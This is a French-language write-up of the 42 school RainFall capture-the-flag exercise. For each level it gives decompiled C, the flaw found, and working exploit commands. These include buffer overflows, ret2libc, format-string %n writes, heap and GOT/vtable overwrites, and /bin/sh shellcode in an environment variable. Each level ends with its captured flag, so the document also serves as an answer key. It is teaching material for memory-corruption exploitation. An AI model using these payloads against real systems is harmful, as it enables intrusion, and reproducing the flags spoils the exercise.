# RainFall
RainFall project from 42

# Flag 0

On voit que la comparaison verifie si iVar1 est 0x1a7, si c'est le cas on a acces au flag suivant.
Donc on a qu'a regarder combien vaut 0x1a7 en decimal, et ca vaut 423.

On execute donc le programme avec 423.

if (iVar1 == 0x1a7)

0x1a7 = 423

./level0 423

## flag : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

# Flag 1
export PATH=/tmp/Python-3.6.15:$PATH

void main(void)

{
  char local_50 [76];
  
  gets(local_50);
  return;
}

76 * "A" puis chunk de 4 lettres pour reperer ou est le degfault

./level1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
Segmentation fault (core dumped)

dmesg | grep segfault
[ 2079.333489] level1[6202]: segfault at 42424242 ip 42424242 sp bffffc90 error 4

42 = B

gdb ./level1
(gdb) info functions
(gdb) p run

$1 = {<text variable, no debug info>} 0x8048444 <run>

(python -c "print 'A'*76 + '\x44\x84\x04\x08'"; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77


## flag : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

# flag 02

// plus d'explications necessaire
ret2libc to bypass the return address overwrite protection

gdb
b main
r
p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
info proc map -> adresse libc = 0xb7e2c000
find 0xb7e2c000, +99999999, "/bin/sh" -> trouve la string /bin/sh dans la libc pour l'utiliser avec system
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
x/s 0xb7f8cc58
0xb7f8cc58:      "/bin/sh"

(python3 exploit.py; cat) | ./level2

## flag : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

# flag 03

void v(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}

addresse de m à controler : 0x804988c

0x40 = 64 en décimal

on a remarqué que nous pouvions faire une format string attack avec printf
et en essayant avec %x pour afficher les valeurs de la stack 4 byte par 4 byte:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %x %x %x %x %x

nous trouvons le résultat suivant :

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 200 2e0ac0 1257d0 41414141 41414141

on peut ensuite utiliser l'argument %n qui écrit le nombre de caractères formatés dans l'argument passé à printf

cependant comme nous ne contrôlons pas les arguments de la fonction printf nous pouvons utiliser le fait que le 4ème élément de la stack est égal à au début de notre buffer pour faire écrire à printf sur l'adresse de m (avec %4$n qui écrit directement sur le 4ème argument de la stack) et ainsi faire en sorte que m soit égal à 64 (0x40) (nombre de caractères imprimés) pour déclencher le system("/bin/sh")

(python -c 'print("\x8c\x98\x04\x08" + (" " * 60) + "%4$n")'; cat) | ./level3

## flag : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

# flag 04

address of m : 0x08049810
valeur visée de m : 0x01025544

./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
AAAA 1246b0 bffffcb4 2dfff4 0 0 bffffc78 804848d bffffa70 200 2e0ac0 1257d0 41414141

le payload commence à la position 12 de la stack
en divisant l'écriture de m en deux (0x0102 et 0x5544) on peut faire deux écritures de 2 bytes chacune avec %hn pour écrire sur l'adresse de m

le payload commence donc par les adresses de m (0x08049810 et 0x08049812)
suivi de l'éciture de 0x5544 (21828) - 8 pour les 4 * 2 bytes des adresses charactères avec le format %21820x
écrites à la première adresse de m (0x08049810) avec %12$hn
par la suite pour écrire 0x0102 nous devons augmenter le compteur de charactère de printf pour faire en sorte que les 4 derniers bytes du compteur
reviennent à 0 ("overflow" 4 bytes)
pour ce faire il nous suffit d'imprimer 43966 charactères (65535 (0xffff) +1 (overflow 4 bytes) - 21828 (0x5544) + 258 (0x102)) avec le format %43966x
et d'écrire cette valeur à la deuxième adresse de m (0x08049812) avec %13$hn

(python exploit.py; cat) | ./level4

## flag : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

# flag 05

(gdb) b n
Breakpoint 1 at 0x80484cb
(gdb) r
Starting program: /home/user/level5/level5

Breakpoint 1, 0x080484cb in n ()
(gdb) disassemble
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
=> 0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disassemble 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6


## flag : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

# flag 06

addresse de n (target function) : 0x08048454

void main(undefined4 param_1,int param_2)

{
  char *__dest;
  undefined4 *puVar1;
  
  __dest = malloc(0x40);
  puVar1 = malloc(4);
  *puVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (*(code *)*puVar1)();
  return;
}

./level6 $(python -c 'print(("A" * 72) + "\x54\x84\x04\x08")') 1

A * 64 remplit les données de _dest
A * 8 remplit le chunk header du malloc de puVar1
l'addresse de n (0x08048454) est écrite dans puVar1
quand le pointeur de fonction (*(code *)*puVar1)() est appelé, il exécute la fonction n

## flag : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

# flag 07

undefined4 main(undefined4 param_1,int param_2)

{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;
  
  puVar1 = malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}


during execution the heap looks like this :
0000 0x10 [var 1]
0000 0x10 [first malloc of var 2]
0000 0x10 [var 3]
0000 0x10 [var 2]

the first strcpy writes in puVar1[1] which points to the firstly allocated malloc of pvVar2
the second strcpy writes in puVar3[1] which points to the actual value of pvVar2

although by doing a buffer overflow we can overwrite a string until it reaches puVar3[1]
by doing so we overwrite the malloc chunk header of puVar3 although it doesn't matter because the header is not used again afterwards
(no malloc or free calls)

payload of first arg is:
padding : A * 20 (from first pvVar2 alloc it requires 8 bytes (data section) + 8 bytes (puVar3 chunk header) + 4 bytes (puVar3[0]) = 20)
address of the GOT of puts : 0x08049928

payload of second arg is:
address of the m function we need to call to print the flag : 0x080484f4

./level7 $(python -c 'print(("A" * 20) + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')

## flag : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

# flag 08


Code décompilé :
```c

undefined4 main(void)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  char *pcVar4;
  int iVar5;
  uint uVar6;
  byte *pbVar7;
  byte *pbVar8;
  bool bVar9;
  undefined1 uVar10;
  undefined1 uVar11;
  undefined1 uVar12;
  bool bVar13;
  undefined1 uVar14;
  byte bVar15;
  byte local_90 [5];
  char local_8b [2];
  char acStack_89 [125];
  
  bVar15 = 0;
  do {
    printf("%p, %p \n",auth,service);
    pcVar4 = fgets((char *)local_90,0x80,stdin);
    bVar9 = false;
    if (pcVar4 == (char *)0x0) {
      return 0;
    }
    iVar5 = 5;
    bVar13 = false;
    pbVar7 = local_90;
    pbVar8 = &DAT_08048819;
    do {
      if (iVar5 == 0) break;
      iVar5 = iVar5 + -1;
      bVar9 = *pbVar7 < *pbVar8;
      bVar13 = *pbVar7 == *pbVar8;
      pbVar7 = pbVar7 + (uint)bVar15 * -2 + 1;
      pbVar8 = pbVar8 + (uint)bVar15 * -2 + 1;
    } while (bVar13);
    uVar10 = 0;
    uVar14 = 0;
    if ((!bVar9 && !bVar13) == bVar9) {
      auth = malloc(4);
      pcVar4 = auth + 1;
      pcVar2 = auth + 2;
      pcVar3 = auth + 3;
      auth[0] = '\0';
      *pcVar4 = '\0';
      *pcVar2 = '\0';
      *pcVar3 = '\0';
      uVar6 = 0xffffffff;
      pcVar4 = local_8b;
      do {
        if (uVar6 == 0) break;
        uVar6 = uVar6 - 1;
        cVar1 = *pcVar4;
        pcVar4 = pcVar4 + (uint)bVar15 * -2 + 1;
      } while (cVar1 != '\0');
      uVar6 = ~uVar6 - 1;
      uVar10 = uVar6 < 0x1e;
      uVar14 = uVar6 == 0x1e;
      if (uVar6 < 0x1f) {
        strcpy(auth,local_8b);
      }
    }
    iVar5 = 5;
    pbVar7 = local_90;
    pbVar8 = (byte *)"reset";
    do {
      if (iVar5 == 0) break;
      iVar5 = iVar5 + -1;
      uVar10 = *pbVar7 < *pbVar8;
      uVar14 = *pbVar7 == *pbVar8;
      pbVar7 = pbVar7 + (uint)bVar15 * -2 + 1;
      pbVar8 = pbVar8 + (uint)bVar15 * -2 + 1;
    } while ((bool)uVar14);
    uVar11 = 0;
    uVar14 = (!(bool)uVar10 && !(bool)uVar14) == (bool)uVar10;
    if ((bool)uVar14) {
      free(auth);
    }
    iVar5 = 6;
    pbVar7 = local_90;
    pbVar8 = (byte *)"service";
    do {
      if (iVar5 == 0) break;
      iVar5 = iVar5 + -1;
      uVar11 = *pbVar7 < *pbVar8;
      uVar14 = *pbVar7 == *pbVar8;
      pbVar7 = pbVar7 + (uint)bVar15 * -2 + 1;
      pbVar8 = pbVar8 + (uint)bVar15 * -2 + 1;
    } while ((bool)uVar14);
    uVar12 = 0;
    uVar10 = 0;
    if ((!(bool)uVar11 && !(bool)uVar14) == (bool)uVar11) {
      uVar12 = (byte *)0xfffffff8 < local_90;
      uVar10 = acStack_89 == (char *)0x0;
      service = strdup(acStack_89);
    }
    iVar5 = 5;
    pbVar7 = local_90;
    pbVar8 = (byte *)"login";
    do {
      if (iVar5 == 0) break;
      iVar5 = iVar5 + -1;
      uVar12 = *pbVar7 < *pbVar8;
      uVar10 = *pbVar7 == *pbVar8;
      pbVar7 = pbVar7 + (uint)bVar15 * -2 + 1;
      pbVar8 = pbVar8 + (uint)bVar15 * -2 + 1;
    } while ((bool)uVar10);
    if ((!(bool)uVar12 && !(bool)uVar10) == (bool)uVar12) {
      if (*(int *)(auth + 0x20) == 0) {
        fwrite("Password:\n",1,10,stdout);
      }
      else {
        system("/bin/sh");
      }
    }
  } while( true );
}
```

En analysant le code décompilé, on trouve la condition pour obtenir le shell dans la commande login :
```c
    if ((!(bool)uVar12 && !(bool)uVar10) == (bool)uVar12) {
      if (*(int *)(auth + 0x20) == 0) {
        fwrite("Password:\n",1,10,stdout);
      }
      else {
        system("/bin/sh");
      }
    }
```
Pour avoir les droits root, il faut que la mémoire située exactement à 0x20 (32 octets) après le pointeur auth contienne une valeur différente de zéro.

Le problème est que lors de l'authentification (avec "auth "), il y a une limite de 30 caractères.
On ne peut donc pas essayer de dépasser avec auth.

Puis on remarque que "auth " et "service " sont tous les deux des mallocs.
Donc on peut utiliser ça pour mettre auth + 32 à une valeur différente de 0.
Vu que malloc prend un espace de 16 entre chaque allocation (pour les informations de taille allouées etc.), on n'a plus qu'à mettre 16 caractères (qui vont être dup) pour que auth + 32 ne soit plus à 0.
En gros, comme le pointeur de service démarre exactement à auth + 16, le 16ème caractère de notre chaîne tombera pile sur la case auth + 32.

./level8
(nil), (nil)
"auth "
0x804a008, (nil)
"service 1234567890123456"       <- 16 char
0x804a008, 0x804a018
"login"
$           <- Flag level9 access


## flag : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a


# flag 09
```c
void main(int param_1,int param_2)

{
  N *this;
  N *this_00;
  
  if (param_1 < 2) {
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  this = operator.new(0x6c);
  N::N(this,5);
  this_00 = operator.new(0x6c);
  N::N(this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (*(code *)**(undefined4 **)this_00)(this_00,this);
  return;
}
```

```c
void __thiscall N::setAnnotation(N *this,char *param_1)

{
  size_t __n;
  
  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}
```
dans la heap les 2 objets this et this_00 sont representés comme ceci :

```this [vtable address (4 bytes)] [int (4 bytes)] [alloc 104 bytes]```

```this_00 [vtable address (4 bytes)] [int (4 bytes)] [alloc 104 bytes]```

comme nous pouvons le voir dans setAnnotation la fonction memcpy ne vérifie pas la taille de ce qui est écrit dans this + 4
(this + 4 correspond à la partie données de l'objet). vu que this est au dessus de this_00 dans la heap, en écrivant plus de 104 bytes dans this + 4, on peut écraser la vtable de this_00 et ainsi faire pointer la vtable de this_00 vers une adresse de notre choix pour exécuter du code arbitraire lors de l'appel de la fonction membre virtuelle de this_00

pour ce faire nous avons récupéré un "Shellcode"[https://shell-storm.org/shellcode/files/shellcode-827.html] qui nous permettra d'executer
un shell.

le payload consiste en :
[l'addresse de this + 8 (pointe sur la string après cette addresse)] [shellcode] [padding pour remplir les 108 - 4 (adresse) - len(shellcode)] [adresse de this (pour écraser la vtable de this_00)]

ainsi lors de l'instruction (*(code *)**(undefined4 **)this_00)(this_00,this);
la "vtable" va correspondre à l'adresse de fin du payload
qui pointe sur l'adresse de début du payload
qui elle correspond au début du shellcode (this + 4 (vtable de this) + 4 (début du payload et l'adresse elle même) -> début shellcode)

le shellcode s'exécutera et nous donnera un shell pour lire le flag dans /home/user/bonus0/.pass

## flag f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

# bonus 0

```c
undefined4 main(void)

{
  char local_3a [54];
  
  pp(local_3a);
  puts(local_3a);
  return 0;
}
```

```c

void pp(char *param_1)

{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  byte bVar4;
  char local_34 [20];
  char local_20 [20];
  
  bVar4 = 0;
  p(local_34,&DAT_080486a0);
  p(local_20,&DAT_080486a0);
  strcpy(param_1,local_34);
  uVar2 = 0xffffffff;
  pcVar3 = param_1;
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
  } while (cVar1 != '\0');
  (param_1 + (~uVar2 - 1))[0] = ' ';
  (param_1 + (~uVar2 - 1))[1] = '\0';
  strcat(param_1,local_20);
  return;
}
```

```c

void p(char *param_1,char *param_2)

{
  char *pcVar1;
  char local_100c [4104];
  
  puts(param_2);
  read(0,local_100c,0x1000);
  pcVar1 = strchr(local_100c,10);
  *pcVar1 = '\0';
  strncpy(param_1,local_100c,0x14);
  return;
}
```

Dans la fonction p, on voit :
```c
strncpy(param_1, local_100c, 0x14);
```

Si on rentre exactement 20 caractères (0x14), strncpy n'ajoute pas de \0 à la fin.

Dans pp, les buffers local_34 et local_20 font 20 octets et sont collés sur la stack.
Si on les remplit tous les deux avec 20 caractères, strcpy va copier local_34, puis déborder sur local_20 car il ne trouve pas de \0.
Ensuite le programme ajoute un espace, et fait un strcat(param_1, local_20).
Total copié : 20 + 20 + 1 + 20 = 61 octets.

Mais on voit dans le main :
```c
char local_3a [54];
```

Le buffer ne fait que 54 octets. On y copie 61 octets, donc on a un Buffer overflow qui écrase l'EIP de main.

En testant avec GDB, on trouve que l'EIP est écrasé exactement à l'offset 10 du deuxième input.

Comme on est limité à 20 caractères par input, on n'a pas la place pour un shellcode de 28 octets.
On met donc le shellcode dans une variable d'environnement précédé d'un gros NOP sled (\x90) et on écrase l'EIP avec son adresse.

```sh
# Commande 1
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')

# Commande 2
echo 'int main() { printf("0x%x\n", getenv("SHELLCODE")); }' > /tmp/find.c && gcc /tmp/find.c -o /tmp/find && /tmp/find

# Commande 3
(python -c 'print "A"*20'; python -c 'print "B"*10 + "\x42\xff\xff\xbf" + "C"*6'; cat) | ./bonus0
```

```txt
payload arg 1 : A * 20 (remplit le 1er buffer sans \0)
payload arg 2 : B * 10 (padding jusqu'à EIP) + adresse de la var d'environnement + C * 6 (pour finir les 20 char)
```

# flag cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

# flag bonus 1

```c
undefined4 main(undefined4 param_1,int param_2)

{
  undefined4 uVar1;
  undefined1 local_3c [40];
  int local_14;
  
  local_14 = atoi(*(char **)(param_2 + 4));
  if (local_14 < 10) {
    memcpy(local_3c,*(void **)(param_2 + 8),local_14 * 4);
    if (local_14 == 0x574f4c46) {
      execl("/bin/sh","sh",0);
    }
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

le programme prend 2 arguments : un int < 10 et une string de char
le programme copie local_14 * 4 bytes de la string dans un buffer de 40 bytes

cependant il n'y a rien qui nous empêche de metrre un int < 0 qui va ensuite être typecast en size_t dans memcpy.
en testant avec -INT_MAX nous obtenons ce résultat :
```txt
-2147483648 : 18446744071562067968 : 0
(int : typecast en size_t : int * 4 typecast en size_t)
```

pour écrire sur eip il nous faut donc un padding de :
40 bytes (taille du buffer) + 4 bytes (retour de atoi) + 8 (gap d'allignement and esp, 0xfffffff0) + 4 bytes (pour l'addresse de ebp) = 56

donc pour trouver le 1er argument il nous suffit juste de faire INT_MAX - (56 + 4(addresse de eip à overwrite) / 4) = -2147483633
on a plus qu'à faire ./bonus1 -2147483633 "<padding de 56> + <adresse de execl dans le programme>"

./bonus1 -2147483633 $(python -c 'print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x82\x84\x04\x
08")')

## flag : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

# Bonus 2

```c
undefined4 main(int param_1,int param_2)

{
  undefined4 uVar1;
  int iVar2;
  char *pcVar3;
  undefined4 *puVar4;
  byte bVar5;
  char local_60 [40];
  char acStack_38 [36];
  char *local_14;
  
  bVar5 = 0;
  if (param_1 == 3) {
    pcVar3 = local_60;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      pcVar3[0] = '\0';
      pcVar3[1] = '\0';
      pcVar3[2] = '\0';
      pcVar3[3] = '\0';
      pcVar3 = pcVar3 + 4;
    }
    strncpy(local_60,*(char **)(param_2 + 4),0x28);
    strncpy(acStack_38,*(char **)(param_2 + 8),0x20);
    local_14 = getenv("LANG");
    if (local_14 != (char *)0x0) {
      iVar2 = memcmp(local_14,&DAT_0804873d,2);
      if (iVar2 == 0) {
        language = 1;
      }
      else {
        iVar2 = memcmp(local_14,&DAT_08048740,2);
        if (iVar2 == 0) {
          language = 2;
        }
      }
    }
    pcVar3 = local_60;
    puVar4 = (undefined4 *)&stack0xffffff50;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar4 = *(undefined4 *)pcVar3;
      pcVar3 = pcVar3 + ((uint)bVar5 * -2 + 1) * 4;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
    uVar1 = greetuser();
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

```c
void greetuser(void)

{
  char local_4c [4];
  undefined4 local_48;
  char local_44 [64];
  
  if (language == 1) {
    local_4c[0] = 'H';
    local_4c[1] = 'y';
    local_4c[2] = 'v';
    local_4c[3] = -0x3d;
    local_48._0_1_ = -0x5c;
    local_48._1_1_ = -0x3d;
    local_48._2_1_ = -0x5c;
    local_48._3_1_ = ' ';
    builtin_strncpy(local_44,"päivää ",0xb);
  }
  else if (language == 2) {
    builtin_strncpy(local_4c,"Goed",4);
    local_48._0_1_ = 'e';
    local_48._1_1_ = 'm';
    local_48._2_1_ = 'i';
    local_48._3_1_ = 'd';
    builtin_strncpy(local_44,"dag!",4);
    local_44[4] = ' ';
    local_44[5] = '\0';
  }
  else if (language == 0) {
    builtin_strncpy(local_4c,"Hell",4);
    local_48._0_3_ = 0x206f;
  }
  strcat(local_4c,&stack0x00000004);
  puts(local_4c);
  return;
}
```

Dans main, on a deux copies d'arguments avec des tailles fixes :
```c
strncpy(local_60,*(char **)(param_2 + 4),0x28); // 0x28 = 40
strncpy(acStack_38,*(char **)(param_2 + 8),0x20); // 0x20 = 32
```

Si on met exactement 40 caractères dans le premier argument, strncpy ne met pas de \0. (Comme l'exo d'avant)

Dans greetuser, la phrase est construite selon la variable d'environnement LANG :
```c
strcat(local_4c,&stack0x00000004); // Notre LANG=nl
```

À cause du fait qu'y ait pas de \0, strcat va copier notre argument 1 (40 octets) et va overflow sur l'argument 2.
La taille des buffers locaux dans greetuser fait 72 octets au total.
Si LANG=nl : "Goedemiddag! " fait 14 caractères. (14 + 40 + 32 = 86, donc suffisant pour atteindre l'eip)

En testand avec GDB, on remarque de l'EIP commence à être écrasé exactement au 24ème caractère (offset 23) de notre deuxième argument.

On peut donc utiliser le même shellcode que le bonus0.


```txt
payload arg 1 : A * 40 (remplit le buffer sans mettre de \0)
payload arg 2 : B * 23 (padding exact) + adresse du shellcode en mémoire
```

```sh
# Mettre le shellcode dans l'env
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')

# Trouver l'adresse
env LANG=nl SHELLCODE=$SHELLCODE /tmp/find

# Lancer l'exploit
LANG=nl ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\x3a\xfb\xff\xbf"')
```

## flag : 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

# flag bonus 3

```c
undefined4 main(int param_1,int param_2)

{
  undefined4 return_val;
  int iVar1;
  char *pcVar2;
  byte bVar3;
  char buffer_65 [65];
  undefined1 local_57;
  char buffer_66 [66];
  FILE *fd;
  
  bVar3 = 0;
  fd = fopen("/home/user/end/.pass","r");
  pcVar2 = buffer_65;
  for (iVar1 = 0x21; iVar1 != 0; iVar1 = iVar1 + -1) {
    pcVar2[0] = '\0';
    pcVar2[1] = '\0';
    pcVar2[2] = '\0';
    pcVar2[3] = '\0';
    pcVar2 = pcVar2 + ((uint)bVar3 * -2 + 1) * 4;
  }
  if ((fd == (FILE *)0x0) || (param_1 != 2)) {
    return_val = 0xffffffff;
  }
  else {
    fread(buffer_65,1,0x42,fd);
    local_57 = 0;
    iVar1 = atoi(*(char **)(param_2 + 4));
    buffer_65[iVar1] = '\0';
    fread(buffer_66,1,0x41,fd);
    fclose(fd);
    iVar1 = strcmp(buffer_65,*(char **)(param_2 + 4));
    if (iVar1 == 0) {
      execl("/bin/sh","sh",0);
    }
    else {
      puts(buffer_66);
    }
    return_val = 0;
  }
  return return_val;
}
```

le programme lit le contenu du fichier .pass et le stock dans buffer_65
il prend ensuite argv[1] et le convertit en int pour null terminate buffer_65 à cet index
pour lancer le shell il faut que le contenu de buffer_65 soit égal à argv[1]
en testant avec ce programme:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main() {
    char flag[] = "579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245"; // flag du bonus 1
    char *input = "";
    int intput = atoi(input);

    flag[intput] = '\0';
    printf("%d" ,strcmp(flag, input));

    return 0;
}
```

nous avons remarqués que atoi("") retourne 0, donc en mettant une string vide en argument, on peut faire en sorte que buffer_65 soit égal à rien tout comme argv[1], et ainsi faire en sorte que strcmp retourne 0 et que le shell soit lancé.


# flag 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c